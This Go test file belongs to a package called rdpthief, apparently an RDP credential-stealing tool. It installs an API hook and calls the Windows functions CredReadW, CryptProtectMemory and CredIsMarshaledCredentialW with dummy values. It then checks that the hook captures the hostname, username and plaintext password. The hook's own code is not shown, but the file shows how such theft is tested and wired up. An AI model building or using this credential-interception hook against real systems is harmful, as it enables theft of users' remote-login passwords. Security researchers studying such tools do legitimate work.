// +build windows

package rdpthief

import (
	"testing"
	"unsafe"

	"github.com/stretchr/testify/require"
	"golang.org/x/sys/windows"
)

func TestHook(t *testing.T) {
	hook := NewHook(func(cred *Credential) {
		require.Equal(t, "hostname", cred.Hostname)
		require.Equal(t, "username", cred.Username)
		require.Equal(t, "test", cred.Password)
	})

	err := hook.Install()
	require.NoError(t, err)

	hostname := windows.StringToUTF16Ptr("hostname")
	proc := windows.NewLazySystemDLL("advapi32.dll").NewProc("CredReadW")
	ret, _, _ := proc.Call(uintptr(unsafe.Pointer(hostname)), 0, 0, 0)
	require.Equal(t, uintptr(0), ret)

	password := []byte{ //  4 + "test" + padding
		0x08, 0x00, 0x00, 0x00, 0x74, 0x00, 0x65, 0x00,
		0x73, 0x00, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00,
	}
	proc = windows.NewLazySystemDLL("crypt32.dll").NewProc("CryptProtectMemory")
	ret, _, _ = proc.Call(uintptr(unsafe.Pointer(&password[0])), 16, 1)
	require.Equal(t, uintptr(1), ret)

	usernamePtr := windows.StringToUTF16Ptr("username")
	proc = windows.NewLazySystemDLL("advapi32.dll").NewProc("CredIsMarshaledCredentialW")
	ret, _, _ = proc.Call(uintptr(unsafe.Pointer(usernamePtr)))
	require.Equal(t, uintptr(0), ret)

	err = hook.Uninstall()
	require.NoError(t, err)

	err = hook.Install()
	require.NoError(t, err)

	err = hook.Uninstall()
	require.NoError(t, err)

	hook.Clean()
}
